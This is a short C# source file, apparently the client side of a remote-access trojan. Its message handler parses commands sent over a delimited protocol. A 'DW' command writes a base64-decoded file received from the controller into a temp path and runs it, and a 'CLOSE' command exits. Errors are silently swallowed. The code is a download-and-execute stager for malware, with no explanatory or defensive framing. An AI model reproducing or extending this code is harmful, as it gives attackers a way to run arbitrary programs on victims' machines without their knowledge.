using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Client
{
    using System;
    using System.IO;

    public class Messages
    {

        public static string EOF = "<EOF>";
        public static string SPL = "<N>";

        public static void Read(byte[] b)
        {
            try
            {
                string msg = Helper.BS(b).Replace(EOF, null);
                string[] A = msg.Split(new string[] { SPL }, StringSplitOptions.None);
                Console.WriteLine("Event Raised");

                switch (A[0])
                {
                    case "CLOSE":
                        Console.WriteLine("e");
                        {
                            Environment.Exit(0);
                            break;
                        }

                    case "DW":
                        {
                            var NewFile = Path.GetTempFileName() + A[1];
                            File.WriteAllBytes(NewFile, Convert.FromBase64String(A[2]));
                            System.Threading.Thread.Sleep(500);
                            System.Diagnostics.Process.Start(NewFile);
                            break;
                        }

                }
            }
            catch (Exception ex)
            {
            }
        }
    }

}
